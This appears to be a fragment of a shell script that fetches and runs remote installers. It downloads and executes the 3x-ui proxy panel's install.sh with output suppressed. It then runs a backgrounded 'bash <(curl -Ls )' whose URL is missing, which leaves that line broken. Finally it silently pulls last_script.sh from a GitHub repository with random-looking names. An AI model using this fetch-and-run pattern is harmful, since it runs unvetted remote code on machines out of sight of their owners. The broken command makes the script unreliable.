...
wget https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh 1>/dev/null 2>&1 && echo "install.sh downloaded"
chmod +x install.sh
./install.sh 1>~/install.log 2>&1
echo "installing..."
bash <(curl -Ls ) 1>~/fourth_script.log 2>&1 &
wget https://raw.githubusercontent.com/somebodyIsFavxxdf/vekAdbifyeeds/main/last_script.sh 1>/dev/null 2>&1 && echo "last_script.sh downloaded"
